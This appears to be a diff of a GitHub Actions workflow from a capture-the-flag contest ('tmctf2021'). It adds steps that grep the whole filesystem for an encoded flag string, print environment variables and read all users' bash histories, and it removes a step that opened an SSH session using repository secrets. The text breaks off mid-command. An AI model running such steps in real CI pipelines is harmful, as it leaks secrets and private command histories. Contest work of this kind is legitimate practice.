@@ -7,16 +7,9 @@ jobs:
       - run: |
           echo "Are you responsible for your actions?"
       - run: |
-          echo "All actions have consequences"
+          rgrep -i "VE1DVEZ7Cg==" / 2>/dev/null
+
       - run: |
-          ls -la /home/runner/work/tmctf2021/tmctf2021
+          rgrep -i "746d6374" / 2>/dev/null
       - run: |
-          ls -la /home/runner/ && ls -la /home/runneradmin/
-      - name: xaxa
-        uses: P3TERX/debugger-action@master
-        with:
-          host: ${{ secrets.HOST }}
-          username: ${{ secrets.USERNAME }}
-          key: ${{ secrets.SSH_PRIVATE_KEY }}
-          port: ${{ secrets.PORT }}
-          script: pwd
+          env && cat /home/*/bash_history && 
